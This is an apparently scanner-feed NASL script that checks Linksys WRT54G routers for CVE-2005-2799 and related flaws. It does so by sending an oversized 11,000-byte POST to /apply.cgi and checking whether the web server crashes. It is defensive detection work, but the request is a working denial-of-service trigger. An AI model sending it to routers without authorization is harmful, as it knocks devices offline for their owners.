if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20096" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_bugtraq_id( 14822 );
	script_cve_id( "CVE-2005-2799", "CVE-2005-2914", "CVE-2005-2915", "CVE-2005-2916" );
	script_xref( name: "OSVDB", value: "19386" );
	script_xref( name: "OSVDB", value: "19387" );
	script_xref( name: "OSVDB", value: "19388" );
	script_xref( name: "OSVDB", value: "19389" );
	script_xref( name: "OSVDB", value: "19390" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Linksys multiple remote vulnerabilities" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2005 Josh Zlatin-Amishav" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "WRT54G/banner" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to firmware version 4.20.7 or later." );
	script_tag( name: "summary", value: "The remote host appears to be a Linksys WRT54G Wireless Router
  which is affected by multiple flaws." );
	script_tag( name: "insight", value: "The firmware version installed on the remote host is prone to several
  flaws,

  - Execute arbitrary commands on the affected router with root privileges.

  - Download and replace the configuration of affected routers via a special
  POST request to the 'restore.cgi' or 'upgrade.cgi' scripts.

  - Allow remote attackers to obtain encrypted configuration information and,
  if the key is known, modify the configuration.

  - Degrade the performance of affected devices and cause the Web server
  to become unresponsive, potentially denying service to legitimate users." );
	script_xref( name: "URL", value: "http://www.idefense.com/application/poi/display?id=304&type=vulnerabilities" );
	script_xref( name: "URL", value: "http://www.idefense.com/application/poi/display?id=305&type=vulnerabilities" );
	script_xref( name: "URL", value: "http://www.idefense.com/application/poi/display?id=306&type=vulnerabilities" );
	script_xref( name: "URL", value: "http://www.idefense.com/application/poi/display?id=307&type=vulnerabilities" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(banner && ContainsString( banner, "realm=\"WRT54G\"" )){
	soc = http_open_socket( port );
	if(!soc){
		exit( 0 );
	}
	len = 11000;
	req = NASLString( "POST ", "/apply.cgi", " HTTP/1.0\\r\\nContent-Length: ", len, "\\r\\n\\r\\n", crap( len ), "\\r\\n" );
	send( socket: soc, data: req );
	http_close_socket( soc );
	sleep( 1 );
	if(http_is_dead( port: port )){
		security_message( port );
		exit( 0 );
	}
}

